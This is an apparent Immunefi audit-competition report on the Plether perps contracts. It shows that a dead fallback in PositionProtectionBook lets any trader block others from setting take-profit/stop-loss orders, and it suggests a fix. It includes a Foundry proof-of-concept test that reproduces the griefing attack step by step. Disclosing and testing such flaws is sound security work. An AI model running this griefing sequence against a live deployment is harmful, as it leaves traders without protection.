# \#97661 [SC-Low] Dead fallback in PositionProtectionBook lets any trader block TP/SL creation after every order execution

**Submitted on Nov 2nd 2026 at 15:46:06 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97661
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description



# Summary

Executing any delayed order moves the Engine mark forward to the order's historical Pyth tick, while the oracle's "accepted basket" (the last live refresh) stays behind. `PositionProtectionBook._acceptedMarkInstalled()` contains an explicit branch (`acceptedTime < markTime`) that treats this state as valid, but `_freshProtectionObservation()` calls `oracle.getLatestPrice(PriceMode.MarkRefresh)` first, and that call enforces publish ordering against the Engine mark and reverts with `PletherOracle__PriceOutOfOrder`. The fallback is dead code. Result: `createPositionProtection` and `replacePositionProtection` revert for every trader until someone pays for a fresh signed Pyth update; a cheap replay (`updateMarkPrice` with empty data) cannot clear it. Because any trader can recreate the state by executing their own order, a griefer can keep a victim from arming a stop-loss for as long as they are willing to pay the open fee (about 4 USDG per round in the PoC), with no profit motive and no privileged role. Impact: Griefing (Medium).

# Description

`PositionProtectionBook._freshProtectionObservation()` is the gate used by `createPositionProtection`, `replacePositionProtection` and the attached-open path:

```solidity
function _freshProtectionObservation() private view returns (uint256 cachedMarkPrice, uint256 currentMarkPrice, uint64 currentPublishTime) {
    IPletherOracle oracle = _activeOracle();
    IPletherOracle.PolicySnapshot memory policy = oracle.getOrderExecutionPolicy(true);
    ...
    uint64 markTime = ENGINE.lastMarkTime();
    cachedMarkPrice = ENGINE.lastMarkPrice();
    ...
    IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh); // (A)
    currentMarkPrice = current.markPrice;
    currentPublishTime = current.publishTime;
    if (!_acceptedMarkInstalled()) {                                                                          // (B)
        revert PositionProtectionBook__OracleMarkAhead();
    }
}

function _acceptedMarkInstalled() private view returns (bool) {
    (bool accepted, uint256 acceptedPrice, uint64 acceptedTime) = _activeOracle().getAcceptedBasketMark();
    if (!accepted) return true;
    uint64 markTime = ENGINE.lastMarkTime();
    return acceptedTime < markTime || (acceptedTime == markTime && acceptedPrice == ENGINE.lastMarkPrice()); // fallback
}
```

(B) was written to accept two states: accepted basket equal to the mark, or accepted basket *older* than the mark (`acceptedTime < markTime`). The second state is not exotic — it is the normal outcome of order execution. `OrderRouterExecutionSidecar._updateEngineMark()` sets the Engine mark to the order's historical tick whenever that tick is newer than the current mark, and the historical path (`PletherOracle._resolveHistoricalOrderBasket`) deliberately never touches `_acceptedBasket`. So after any order commits later than the last live refresh and executes, `markTime > acceptedTime`.

In that state (A) is reached first and fails. `PletherOracle.getLatestPrice(mode)` → `_getLatestPriceSnapshotWithConfidence` → `_snapshotFromBasket(basket, policy, enforcePublishOrder = true)`:

```solidity
if (enforcePublishOrder) {
    uint64 markTime = engine.lastMarkTime();
    if (snapshot.publishTime < markTime) {
        revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
    }
```

The accepted basket's `publishTime` is `acceptedTime < markTime`, so the view reverts and `_acceptedMarkInstalled()` never executes. The only thing that clears the state is a *new signed live update* (`router.updateMarkPrice(pythData)` with a Hermes payload and Pyth fee): the free replay path (`updateMarkPrice(new bytes[](0))`) goes through the same `_acceptedLiveBasket` + `_snapshotFromBasket(…, true)` and reverts identically (shown in the PoC).

Two properties make this more than a race condition:

- **Anyone can put the system into the state.** Committing and self-executing an ordinary open (minimum 1,000 USDG notional at release settings, executor = self so the bounty returns to the attacker) is enough. Cost per round is the execution fee (0.04 % of notional → 0.40 USDG at the minimum size; 4 USDG at the 10,000 USDG size used in the PoC) plus Pyth fee and gas. There is no profit, which is what makes it griefing rather than theft.
- **The cure is an action nobody is paid for.** A plain mark refresh carries no bounty; the project's own scope notes say "some actions pay no bounty, so availability depends on operator funding". Between executions and the next funded live refresh, every trader in the system is unable to arm or re-arm a TP/SL, and existing orders keep executing (each one re-extends the state).

The inconsistency is visible inside the Book itself: `afterOrderTerminal` (arming an attached protection when its parent executes) uses only `_acceptedMarkInstalled()` and therefore *does* honour the `acceptedTime < markTime` state, while the trader-initiated create/replace paths cannot. The fallback exists because the authors knew the state is legitimate; the ordering of (A) and (B) defeats it.

This is distinct from the already-reported items in the same area: Cecuro MED-17/MED-23 concern *triggering* an armed protection being blocked by oracle timing, MED-28 concerns arming from a stale mark; this report is about *creation and replacement* being impossible because of a dead-code fallback, and about that state being reproducible on demand by an unprivileged party.

# Impact

Griefing (Medium). An attacker with no privileges and no profit motive can repeatedly prevent other traders from creating or replacing take-profit/stop-loss protection, at a cost of a few USDG per round, for as long as no third party pays for a live oracle refresh; victims lose the gas of every reverted attempt and, more importantly, sit in open leveraged positions without the stop-loss they tried to set while the price moves. Nothing is frozen and no funds are lost directly, so this does not reach the High tier, but it is squarely the rubric's griefing definition: the attacker "calls certain functions of the smart contract that would put it in a suboptimal state, thus blocking normal function execution for any user … the user would be able to call the function once again" after the state is cleared. It also independently qualifies under the Low "contract fails to deliver promised returns" definition even without an attacker, since routine order flow produces the same state.

Preconditions are routine: at least one delayed order executed after the last live refresh. No trusted role is involved; keepers are explicitly untrusted in scope, and the attacker acts as an ordinary trader/keeper.

Fix: in `_freshProtectionObservation`, evaluate `_acceptedMarkInstalled()` before calling `getLatestPrice`, and when the Engine mark is ahead use the Engine mark (`ENGINE.lastMarkPrice()`, `ENGINE.lastMarkTime()`) as the "current" observation instead of the oracle view; or add an oracle view that returns the accepted basket without `enforcePublishOrder`.




## Proof of Concept


Foundry tests on the repository's own production-stack harness (`BasePerpTest`), file `packages/perps/test/perps/poc/PoC_ProtectionCreationBlockedByMarkAhead.t.sol`. Run from `packages/perps`:

```
forge test --match-path 'test/perps/poc/PoC_ProtectionCreation*' -vv
```

Result:

```
[PASS] test_DeadFallback_CreationRevertsWheneverEngineMarkIsAheadOfAcceptedBasket()
[PASS] test_Griefing_AttackerRepeatedlyBlocksVictimFromArmingProtection()
Logs:
  attacker total settlement cost for 3 rounds (6-dec USDG): 12000000
```

Test 1 proves the dead fallback: after one ordinary order executes, `acceptedTime < markTime`, `_acceptedMarkInstalled()`'s own predicate evaluates to `true`, yet `createPositionProtection` reverts with `PletherOracle__PriceOutOfOrder(acceptedTime, markTime)`; the free replay refresh reverts the same way; a paid live refresh unblocks creation. Test 2 proves the Medium impact: Mallory (unprivileged) executes her own order three times, each time Alice's attempt to arm a stop-loss is rejected (3/3), a relayer has to pay for a live refresh each round, and Mallory's total cost is 12 USDG.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract PoC_ProtectionCreationBlockedByMarkAhead is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // victim: has a position, wants a stop-loss
    address internal constant MALLORY = address(0x5A1); // griefer: ordinary trader / keeper, no privileges
    address internal constant RELAYER = address(0xE0EC); // anyone who later sends a live Pyth refresh

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN = 2_000e6;
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000;

    IOrderLifecycleBook internal book;
    IPositionProtectionActions internal protection;
    IPositionProtectionViews internal protectionViews;

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        protection = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 20_000e6);
        _fundTrader(MALLORY, 50_000e6);
        _refreshMark(MARK_PRICE);
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN, MARK_PRICE);
    }

    function test_DeadFallback_CreationRevertsWheneverEngineMarkIsAheadOfAcceptedBasket() public {
        // Sanity: in the clean state (accepted basket == engine mark) Alice could protect her position.
        uint256 snapshot = vm.snapshotState();
        vm.prank(ALICE);
        protection.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
        vm.revertToState(snapshot);

        // 1. Any delayed order executes against a historical Pyth tick newer than the last live refresh. The Router
        //    then moves the Engine mark forward, but the oracle's accepted basket stays where it was.
        (, , uint64 acceptedBefore) = pletherOracle.getAcceptedBasketMark();
        _malloryExecutesOwnOrder(bytes32("push-1"));
        (bool accepted, uint256 acceptedPrice, uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
        uint64 markTime = engine.lastMarkTime();
        assertEq(acceptedTime, acceptedBefore, "accepted basket untouched by historical execution");
        assertGt(markTime, acceptedTime, "engine mark is now AHEAD of the accepted basket");

        // 2. This is precisely the state `_acceptedMarkInstalled()` accepts via its `acceptedTime < markTime` branch...
        bool fallbackWouldAccept = !accepted || acceptedTime < markTime
            || (acceptedTime == markTime && acceptedPrice == engine.lastMarkPrice());
        assertTrue(fallbackWouldAccept, "the Book's own fallback says this state is fine");

        // 3. ...yet creation reverts earlier, inside oracle.getLatestPrice(MarkRefresh), with PriceOutOfOrder.
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
        );
        protection.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));

        // Replaying the accepted basket (the cheap, no-Pyth-fee refresh) cannot clear it either.
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
        );
        router.updateMarkPrice(new bytes[](0));

        // 4. Only a fresh signed live update (new Hermes payload, Pyth fee) re-syncs the two and unblocks Alice.
        vm.prank(RELAYER);
        _refreshMark(MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protection.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed)
        );
    }

    function test_Griefing_AttackerRepeatedlyBlocksVictimFromArmingProtection() public {
        uint256 malloryStart = _settlementBalance(MALLORY);
        uint256 blockedAttempts;

        for (uint256 round; round < 3; ++round) {
            // Mallory executes one of her own small orders: this is all it takes to push the Engine mark ahead.
            _malloryExecutesOwnOrder(bytes32(uint256(0x1000 + round)));

            // Alice's stop-loss creation (or a replace of an existing one) reverts for as long as the state lasts.
            vm.prank(ALICE);
            (bool ok,) = address(protection).call(
                abi.encodeCall(
                    IPositionProtectionActions.createPositionProtection, (_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS))
                )
            );
            if (!ok) ++blockedAttempts;
            assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "Alice still has no protection");

            // The market "heals" when someone pays for a live refresh; Mallory simply does it again afterwards.
            vm.prank(RELAYER);
            _refreshMark(MARK_PRICE);
        }
        assertEq(blockedAttempts, 3, "every attempt landing after an execution was rejected");

        // Mallory's cost per round is the open fee on a 10,000 USDG notional (execution fee bps of notional) plus
        // Pyth/gas; her open-order bounty flows back to herself because she is her own executor.
        uint256 malloryCost = malloryStart - _settlementBalance(MALLORY);
        emit log_named_uint("attacker total settlement cost for 3 rounds (6-dec USDG)", malloryCost);
        assertLt(malloryCost, 50e6, "blocking three protection attempts cost Mallory under 50 USDG");

        // Alice finally arms once the state is clean, proving nothing else about her request was wrong.
        vm.prank(ALICE);
        protection.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
    }

    /// @dev Mallory commits and self-executes an ordinary open using the standard historical-tick path.
    function _malloryExecutesOwnOrder(bytes32 clientOrderId) internal {
        OrderV3Types.OrderRequest memory request = _openRequest(clientOrderId);
        vm.prank(MALLORY);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(MARK_PRICE); // unique tick at commitTime + 1
        vm.prank(MALLORY);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Mallory's order executed");
    }

    function _refreshMark(uint256 price) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _params(uint256 takeProfit, uint256 stopLoss)
        internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _openRequest(bytes32 clientOrderId) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = POSITION_MARGIN;
        request.targetPrice = 1;
        request.isClose = false;
        uint256 window = router.maxExecutionWindowSeconds();
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}
```


